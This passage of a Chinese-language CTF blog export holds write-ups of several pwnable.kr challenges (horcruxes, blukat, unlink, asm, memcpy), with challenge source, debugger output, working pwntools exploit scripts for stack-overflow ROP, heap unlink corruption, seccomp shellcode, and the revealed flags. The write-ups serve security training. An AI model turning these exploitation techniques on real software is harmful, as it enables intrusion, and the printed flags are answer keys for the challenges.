G();</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;How many EXP did you earned? : &quot;);</span><br><span class="line">    gets(s);</span><br><span class="line">    if ( atoi(s) &#x3D;&#x3D; sum )</span><br><span class="line">    &#123;</span><br><span class="line">      fd &#x3D; open(&quot;flag&quot;, 0);</span><br><span class="line">      s[read(fd, s, 0x64u)] &#x3D; 0;</span><br><span class="line">      puts(s);</span><br><span class="line">      close(fd);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;You&#39;d better get more experience to kill Voldemort&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在gets中存在栈溢出，题目是要知道A+B+C+D+E+F+G的值，等于sum即可，所以我们只要通过ROP，分别执行A、B、C、D、E、F、G，最后再执行ropme，输入sum</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">p &#x3D; process(&#39;horcruxes&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;horcruxes&#39;)</span><br><span class="line">A &#x3D; elf.symbols[&#39;A&#39;]</span><br><span class="line">B &#x3D; elf.symbols[&#39;B&#39;]</span><br><span class="line">C &#x3D; elf.symbols[&#39;C&#39;]</span><br><span class="line">D &#x3D; elf.symbols[&#39;D&#39;]</span><br><span class="line">E &#x3D; elf.symbols[&#39;E&#39;]</span><br><span class="line">F &#x3D; elf.symbols[&#39;F&#39;]</span><br><span class="line">G &#x3D; elf.symbols[&#39;G&#39;]</span><br><span class="line">ropme &#x3D; elf.symbols[&#39;ropme&#39;]</span><br><span class="line">ropme &#x3D; 0x809fffc</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x74+4)</span><br><span class="line">payload +&#x3D; p32(A)+p32(B)+p32(C)+p32(D)+p32(E)+p32(F)+p32(G)+p32(ropme)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">import  time</span><br><span class="line">time.sleep(1)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">result &#x3D; p.recv().split(&#39;\n&#39;)[4:11]</span><br><span class="line">total &#x3D; 0</span><br><span class="line">for line in result:</span><br><span class="line">    line &#x3D; line.split(&#39;+&#39;)[1].split(&#39;)&#39;)[0]</span><br><span class="line">    print line</span><br><span class="line">    total+&#x3D;eval(line)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(str(total))</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— blukat</title>
    <url>/df231074.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sometimes, pwnable is strange...</span><br><span class="line">hint: if this challenge is hard, you are a skilled player.</span><br><span class="line"></span><br><span class="line">ssh blukat@pwnable.kr -p2222 (pw: guest)</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>调试了下看到了password，输入就行了</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x6010a0 &lt;password&gt;:    0x736170203a746163      0x50203a64726f7773</span><br><span class="line">0x6010b0 &lt;password+16&gt;: 0x6f697373696d7265      0x6465696e6564206e</span><br></pre></td></tr></table></figure><p>密码是 <code>cat: password: Permission denied</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">blukat@prowl:~$ ./blukat</span><br><span class="line">guess the password!</span><br><span class="line">cat: password: Permission denied</span><br><span class="line">congrats! here is your flag: Pl3as_DonT_Miss_youR_GrouP_Perm!!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— unlink</title>
    <url>/9f35ac76.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy! how can I exploit unlink corruption?</span><br><span class="line"></span><br><span class="line">ssh unlink@pwnable.kr -p2222 (pw: guest)</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="punlink-c">unlink.c</span><a href="#punlink-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">typedef struct tagOBJ&#123;</span><br><span class="line">        struct tagOBJ* fd;</span><br><span class="line">        struct tagOBJ* bk;</span><br><span class="line">        char buf[8];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line">void shell()&#123;</span><br><span class="line">        system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void unlink(OBJ* P)&#123;</span><br><span class="line">        OBJ* BK;</span><br><span class="line">        OBJ* FD;</span><br><span class="line">        BK&#x3D;P-&gt;bk;</span><br><span class="line">        FD&#x3D;P-&gt;fd;</span><br><span class="line">        FD-&gt;bk&#x3D;BK;</span><br><span class="line">        BK-&gt;fd&#x3D;FD;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">        malloc(1024);</span><br><span class="line">        OBJ* A &#x3D; (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line">        OBJ* B &#x3D; (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line">        OBJ* C &#x3D; (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; double linked list: A &lt;-&gt; B &lt;-&gt; C</span><br><span class="line">        A-&gt;fd &#x3D; B;</span><br><span class="line">        B-&gt;bk &#x3D; A;</span><br><span class="line">        B-&gt;fd &#x3D; C;</span><br><span class="line">        C-&gt;bk &#x3D; B;</span><br><span class="line"></span><br><span class="line">        printf(&quot;here is stack address leak: %p\n&quot;, &amp;A);</span><br><span class="line">        printf(&quot;here is heap address leak: %p\n&quot;, A);</span><br><span class="line">        printf(&quot;now that you have leaks, get shell!\n&quot;);</span><br><span class="line">        &#x2F;&#x2F; heap overflow!</span><br><span class="line">        gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; exploit this unlink!</span><br><span class="line">        unlink(B);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><h3><span id="pkuai-xin-xi">块信息</span><a href="#pkuai-xin-xi" class="header-anchor">#</a></h3><p>首先我们看下A、B、C的块信息，在printf处打断点</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x804b408 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0x0,</span><br><span class="line">  size &#x3D; 0x19,</span><br><span class="line">  fd &#x3D; 0x804b428,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x804b420 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0x0,</span><br><span class="line">  size &#x3D; 0x19,</span><br><span class="line">  fd &#x3D; 0x804b440,</span><br><span class="line">  bk &#x3D; 0x804b410,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x804b438 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0x0,</span><br><span class="line">  size &#x3D; 0x19,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x804b428,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gdb-peda$ x&#x2F;20x 0x804b408</span><br><span class="line">0x804b408:	0x00000000	0x00000019	0x0804b428	0x00000000</span><br><span class="line">0x804b418:	0x00000000	0x00000000	0x00000000	0x00000019</span><br><span class="line">0x804b428:	0x0804b440	0x0804b410	0x00000000	0x00000000</span><br><span class="line">0x804b438:	0x00000000	0x00000019	0x00000000	0x0804b428</span><br><span class="line">0x804b448:	0x00000000	0x00000000	0x00000000	0x00020bb1</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">here is stack address leak: 0xffffd6c4</span><br><span class="line">here is heap address leak: 0x804b410</span><br><span class="line">now that you have leaks, get shell!</span><br></pre></td></tr></table></figure><p>可以看到三个块在内存上是连续的，同时代码里可以看到gets函数存在溢出，可以覆盖其他内存地址。</p><h3><span id="punlink">unlink</span><a href="#punlink" class="header-anchor">#</a></h3><p>我们要实现任意地址写，已有目标地址<code>target_addr</code>，写入值<code>expect_value</code><br>那么我们可以推导以下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A、B、C结构</span><br><span class="line"> --------------</span><br><span class="line">|+0 | fd       |</span><br><span class="line"> --------------</span><br><span class="line">|+4 | bk       |</span><br><span class="line"> --------------</span><br><span class="line">|+8 | buf[0-4] |</span><br><span class="line"> --------------</span><br><span class="line">|+12| buf[4-8] |</span><br><span class="line"> --------------</span><br><span class="line"></span><br><span class="line">BK&#x3D;P-&gt;bk;   &#x3D;&gt;BK &#x3D; *(P+4) </span><br><span class="line">FD&#x3D;P-&gt;fd;   &#x3D;&gt;FD &#x3D; *P</span><br><span class="line">FD-&gt;bk&#x3D;BK;  &#x3D;&gt;*((*P)+4)&#x3D;*(P+4)</span><br><span class="line">BK-&gt;fd&#x3D;FD;  &#x3D;&gt;*(*(P+4))&#x3D;*P</span><br></pre></td></tr></table></figure><p>因此存在两处任意地址写，我们主要利用下面那个<code>*(*(P+4))=*P</code></p><p>对于本题来说，已知A的栈地址A_stack和A的堆地址A_heap，举例我们需要向stack_addr(和A_stack存在一定偏移)中写入shell函数的地址shell_addr。</p><p>我们可以得到buf的地址是A_heap+8，可存shell_addr地址，我们在B的bk中写入目标栈地址stack_addr，这时我们可以写入<code>*stack_addr=*P</code>，我们需要<code>*P=shell_addr</code>，所以我们在B的fd中填入<code>A_heap+8</code>的值即可。</p><p>注意到有以下一段</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">80485ff:   8b 4d fc                 mov    -0x4(%ebp),%ecx</span><br><span class="line"> 8048602:   c9                      leave  </span><br><span class="line"> 8048603:   8d 61 fc                lea    -0x4(%ecx),%esp</span><br><span class="line"> 8048606:   c3                      ret</span><br></pre></td></tr></table></figure><p>将值取出赋值给ecx，后将*(ecx-4)的值赋值给esp。</p><p>所以我们需要进行修正，将<code>A_heap+8</code>，改成<code>A_heap+12</code>。</p><p>这时，赋值给ecx的值是<code>A_heap+12</code>，减去4后得到<code>A_heap+8</code>，最后赋值我们可以得到esp的值为<code>*(A_heap+8)</code>，也就是shell_addr，完成跳转。</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;unlink&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;here is stack address leak: &quot;)</span><br><span class="line">stack_address &#x3D; int(p.recvline(), 16)</span><br><span class="line">p.recvuntil(&quot;here is heap address leak: &quot;)</span><br><span class="line">heap_address &#x3D; int(p.recvline(), 16)</span><br><span class="line">p.recvuntil(&quot;now that you have leaks, get shell!&quot;)</span><br><span class="line">print(&quot;stack_address:&quot;, hex(stack_address), &quot;heap_address&quot;, hex(heap_address))</span><br><span class="line"></span><br><span class="line">payload &#x3D; p32(0x080484EB) + b&#39;a&#39;*12 + p32(heap_address + 0xc) + p32(stack_address + 0x10)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@5c619b760e10:~&#x2F;test# python3 unlink.py</span><br><span class="line">[+] Starting local process &#39;.&#x2F;unlink&#39;: pid 71</span><br><span class="line">stack_address: 0xffe33994 heap_address 0x955c410</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">unlink    unlink.py</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— asm</title>
    <url>/d7bb76ce.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mommy! I think I know how to make shellcodes</span><br><span class="line"></span><br><span class="line">ssh asm@pwnable.kr -p2222 (pw: guest)</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>拖入ida伪代码可以看到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">puts(&quot;Welcome to shellcoding practice challenge.&quot;);</span><br><span class="line">puts(&quot;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.&quot;);</span><br><span class="line">puts(&quot;Try to make shellcode that spits flag using open()&#x2F;read()&#x2F;write() systemcalls only.&quot;);</span><br><span class="line">puts(&quot;If this does not challenge you. you should play &#39;asg&#39; challenge :)&quot;);</span><br><span class="line">s &#x3D; (char *)mmap((void *)0x41414000, 0x1000uLL, 7, 50, 0, 0LL);</span><br><span class="line">memset(s, 144, 0x1000uLL);</span><br><span class="line">v4 &#x3D; strlen(stub);</span><br><span class="line">memcpy(s, stub, v4);</span><br><span class="line">printf(&quot;give me your x64 shellcode: &quot;, stub, argv);</span><br><span class="line">read(0, s + 46, 0x3E8uLL);</span><br><span class="line">alarm(0xAu);</span><br><span class="line">chroot(&quot;&#x2F;home&#x2F;asm_pwn&quot;);</span><br><span class="line">sandbox(&quot;&#x2F;home&#x2F;asm_pwn&quot;);</span><br><span class="line">((void (*)(void))s)();</span><br></pre></td></tr></table></figure><p>也就是要求我们自己写shellcode，来实现读取flag的操作，注意，只能使用open，read，write三个系统函数。</p><p>本来网站<code>http://syscalls.kernelgrok.com/</code>可以查调用表的，不过好像因为维护上不去，所以我用它的github项目部署了一下<code>http://syscall.ycdxsb.cn/</code></p><p>这里为了方便些shellcode，我们可以用pwntools的shellcraft模块编写<code>http://docs.pwntools.com/en/stable/shellcraft/amd64.html</code></p><p>首先我们需要将函数名push到栈中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename &#x3D; &#39;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&#39;</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; shellcraft.amd64.pushstr(filename)</span><br></pre></td></tr></table></figure><p>由于是push进去的，所以这个时候rsp存的就是函数名，接着我们使用open打开这个文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload +&#x3D; shellcraft.amd64.open(&#39;rsp&#39;,0,0)</span><br></pre></td></tr></table></figure><p>由于是封装好了，所以这里的参数和实际的open函数参数一致</p><p>对于64位函数，执行完后的返回值就在rax中，也就是我们open函数的fd值在rax中，然后我们需要使用read函数将内容读到rsp指向的内存中，如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload +&#x3D; shellcraft.amd64.read(&#39;rax&#39;,&#39;rsp&#39;,100)</span><br></pre></td></tr></table></figure><p>最后使用write函数将rsp内容输出到屏幕上</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload +&#x3D; shellcraft.amd64.write(1,&#39;rsp&#39;,100)</span><br></pre></td></tr></table></figure><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch&#x3D;&#39;amd64&#39;,os&#x3D;&#39;linux&#39;)</span><br><span class="line">#p &#x3D; process(&#39;asm&#39;)</span><br><span class="line">p &#x3D; remote(&#39;127.0.0.1&#39;,99026)</span><br><span class="line"></span><br><span class="line">filename &#x3D; &#39;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&#39;</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; shellcraft.amd64.pushstr(filename)</span><br><span class="line">payload +&#x3D; shellcraft.amd64.open(&#39;rsp&#39;,0,0)</span><br><span class="line">payload +&#x3D; shellcraft.amd64.read(&#39;rax&#39;,&#39;rsp&#39;,100)</span><br><span class="line">payload +&#x3D; shellcraft.amd64.write(1,&#39;rsp&#39;,100)</span><br><span class="line">p.recvuntil(&#39;shellcode: &#39;)</span><br><span class="line">p.sendline(asm(payload))</span><br><span class="line">print p.recv()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x64 bytes:</span><br><span class="line">    &#39;Mak1ng_shelLcodE_i5_veRy_eaSy\n&#39;</span><br><span class="line">    &#39;lease_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooo&#39;</span><br><span class="line">Mak1ng_shelLcodE_i5_veRy_eaSy</span><br><span class="line">lease_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooo</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>Mak1ng_shelLcodE_i5_veRy_eaSy</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— memcpy</title>
    <url>/95b3b1b5.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Are you tired of hacking?, take some rest here.</span><br><span class="line">Just help me out with my small experiment regarding memcpy performance. </span><br><span class="line">after that, flag is yours.</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;memcpy.c</span><br><span class="line"></span><br><span class="line">ssh memcpy@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="pmemcpy-c">memcpy.c</span><a href="#pmemcpy-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; compiled with : gcc -o memcpy memcpy.c -m32 -lm</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned long long rdtsc()&#123;</span><br><span class="line">        asm(&quot;rdtsc&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char* slow_memcpy(char* dest, const char* src, size_t len)&#123;</span><br><span class="line">	int i;</span><br><span class="line">	for (i&#x3D;0; i&lt;len; i++) &#123;</span><br><span class="line">		dest[i] &#x3D; src[i];</span><br><span class="line">	&#125;</span><br><span class="line">	return dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char* fast_memcpy(char* dest, const char* src, size_t len)&#123;</span><br><span class="line">	size_t i;</span><br><span class="line">	&#x2F;&#x2F; 64-byte block fast copy</span><br><span class="line">	if(len &gt;&#x3D; 64)&#123;</span><br><span class="line">		i &#x3D; len &#x2F; 64;</span><br><span class="line">		len &amp;&#x3D; (64-1);</span><br><span class="line">		while(i-- &gt; 0)&#123;</span><br><span class="line">			__asm__ __volatile__ (</span><br><span class="line">			&quot;movdqa (%0), %%xmm0\n&quot;</span><br><span class="line">			&quot;movdqa 16(%0), %%xmm1\n&quot;</span><br><span class="line">			&quot;movdqa 32(%0), %%xmm2\n&quot;</span><br><span class="line">			&quot;movdqa 48(%0), %%xmm3\n&quot;</span><br><span class="line">			&quot;movntps %%xmm0, (%1)\n&quot;</span><br><span class="line">			&quot;movntps %%xmm1, 16(%1)\n&quot;</span><br><span class="line">			&quot;movntps %%xmm2, 32(%1)\n&quot;</span><br><span class="line">			&quot;movntps %%xmm3, 48(%1)\n&quot;</span><br><span class="line">			::&quot;r&quot;(src),&quot;r&quot;(dest):&quot;memory&quot;);</span><br><span class="line">			dest +&#x3D; 64;</span><br><span class="line">			src +&#x3D; 64;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; byte-to-byte slow copy</span><br><span class="line">	if(len) slow_memcpy(dest, src, len);</span><br><span class="line">	return dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line"></span><br><span class="line">	setvbuf(stdout, 0, _IONBF, 0);</span><br><span class="line">	setvbuf(stdin, 0, _IOLBF, 0);</span><br><span class="line"></span><br><span class="line">	printf(&quot;Hey, I have a boring assignment for CS class.. :(\n&quot;);</span><br><span class="line">	printf(&quot;The assignment is simple.\n&quot;);</span><br><span class="line"></span><br><span class="line">	printf(&quot;-----------------------------------------------------\n&quot;);</span><br><span class="line">	printf(&quot;- What is the best implementation of memcpy?        -\n&quot;);</span><br><span class="line">	printf(&quot;- 1. implement your own slow&#x2F;fast version of memcpy -\n&quot;);</span><br><span class="line">	printf(&quot;- 2. compare them with various size of data         -\n&quot;);</span><br><span class="line">	printf(&quot;- 3. conclude your experiment and submit report     -\n&quot;);</span><br><span class="line">	printf(&quot;-----------------------------------------------------\n&quot;);</span><br><span class="line"></span><br><span class="line">	printf(&quot;This time, just help me out with my experiment and get flag\n&quot;);</span><br><span class="line">	printf(&quot;No fancy hacking, I promise :D\n&quot;);</span><br><span class="line"></span><br><span class="line">	unsigned long long t1, t2;</span><br><span class="line">	int e;</span><br><span class="line">	char* src;</span><br><span class="line">	char* dest;</span><br><span class="line">	unsigned int low, high;</span><br><span class="line">	unsigned int size;</span><br><span class="line">	&#x2F;&#x2F; allocate memory</span><br><span class="line">	char* cache1 &#x3D; mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);</span><br><span class="line">	char* cache2 &#x3D; mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);</span><br><span class="line">	src &#x3D; mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);</span><br><span class="line"></span><br><span class="line">	size_t sizes[10];</span><br><span class="line">	int i&#x3D;0;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; setup experiment parameters</span><br><span class="line">	for(e&#x3D;4; e&lt;14; e++)&#123;	&#x2F;&#x2F; 2^13 &#x3D; 8K</span><br><span class="line">		low &#x3D; pow(2,e-1);</span><br><span class="line">		high &#x3D; pow(2,e);</span><br><span class="line">		printf(&quot;specify the memcpy amount between %d ~ %d : &quot;, low, high);</span><br><span class="line">		scanf(&quot;%d&quot;, &amp;size);</span><br><span class="line">		if( size &lt; low || size &gt; high )&#123;</span><br><span class="line">			printf(&quot;don&#39;t mess with the experiment.\n&quot;);</span><br><span class="line">			exit(0);</span><br><span class="line">		&#125;</span><br><span class="line">		sizes[i++] &#x3D; size;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sleep(1);</span><br><span class="line">	printf(&quot;ok, lets run the experiment with your configuration\n&quot;);</span><br><span class="line">	sleep(1);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; run experiment</span><br><span class="line">	for(i&#x3D;0; i&lt;10; i++)&#123;</span><br><span class="line">		size &#x3D; sizes[i];</span><br><span class="line">		printf(&quot;experiment %d : memcpy with buffer size %d\n&quot;, i+1, size);</span><br><span class="line">		dest &#x3D; malloc( size );</span><br><span class="line"></span><br><span class="line">		memcpy(cache1, cache2, 0x4000);		&#x2F;&#x2F; to eliminate cache effect</span><br><span class="line">		t1 &#x3D; rdtsc();</span><br><span class="line">		slow_memcpy(dest, src, size);		&#x2F;&#x2F; byte-to-byte memcpy</span><br><span class="line">		t2 &#x3D; rdtsc();</span><br><span class="line">		printf(&quot;ellapsed CPU cycles for slow_memcpy : %llu\n&quot;, t2-t1);</span><br><span class="line"></span><br><span class="line">		memcpy(cache1, cache2, 0x4000);		&#x2F;&#x2F; to eliminate cache effect</span><br><span class="line">		t1 &#x3D; rdtsc();</span><br><span class="line">		fast_memcpy(dest, src, size);		&#x2F;&#x2F; block-to-block memcpy</span><br><span class="line">		t2 &#x3D; rdtsc();</span><br><span class="line">		printf(&quot;ellapsed CPU cycles for fast_memcpy : %llu\n&quot;, t2-t1);</span><br><span class="line">		printf(&quot;\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;thanks for helping my experiment!\n&quot;);</span><br><span class="line">	printf(&quot;flag : ----- erased in this source code -----\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是依次使用<code>fast_memcpy</code>和<code>slow_memcpy</code> 函数比较使用时间</p><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>随便输入范围内数字会出现<code>segmentation fault</code>，问题出在汇编指令<code>movntps</code>。</p><p>查阅资料可以看到，当使用这个指令时，内存必须按照16字节对齐</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The destination operand is a 128-bit or 256-bit memory location. The memory operand must be aligned on a 16-byte (128-bit version) or 32-byte (VEX.256 encoded version) boundary otherwise a general-protection exception (#GP) will be generated.</span><br></pre></td></tr></table></figure><p>而用户使用malloc申请内存却是以8字节对齐的，假如用户申请内存大小x，那么分配后的块大小为<code>8*(int((x+4)/8)+1)</code>。</p><p>因此对于给定大小low和high限定，我们可以计算得到合适的内存大小x</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def get_input(low,high):</span><br><span class="line">    for i in xrange(low,high):</span><br><span class="line">        if ((i+4)%16&gt;&#x3D;9) or ((i+4)%16&#x3D;&#x3D;0):</span><br><span class="line">            return i</span><br></pre></td></tr></table></figure><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">def get_input(low,high):</span><br><span class="line">    for i in xrange(low,high):</span><br><span class="line">        if ((i+4)%16&gt;&#x3D;9) or ((i+4)%16&#x3D;&#x3D;0):</span><br><span class="line">            return i</span><br><span class="line"></span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">p &#x3D; remote(&quot;pwnable.kr&quot;,9022)</span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;memcpy&#39;)</span><br><span class="line">for i in range(0,10):</span><br><span class="line">    import time</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    result &#x3D; p.recv()</span><br><span class="line">    result &#x3D; result.split(&quot;\n&quot;)[-1]</span><br><span class="line">    low &#x3D; int(result.split(&quot; &quot;)[5])</span><br><span class="line">    high &#x3D; int(result.split(&quot; &quot;)[7])</span><br><span class="line">    output &#x3D; get_input(low,high)</span><br><span class="line">    print &quot;info:%d %d , input: %d&quot;%(low,high,output)</span><br><span class="line">    p.sendline(str(output))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> ↵ 1  python CTF&#x2F;Challenges&#x2F;pwnable.kr&#x2F;part1&#x2F;memcpy&#x2F;memcpy.py</span><br><span class="line">[+] Opening connection to pwnable.kr on port 9022: Done</span><br><span class="line">info:8 16 , input: 8</span><br><span class="line">info:16 32 , input: 21</span><br><span class="line">info:32 64 , input: 37</span><br><span class="line">info:64 128 , input: 69</span><br><span class="line">info:128 256 , input: 133</span><br><span 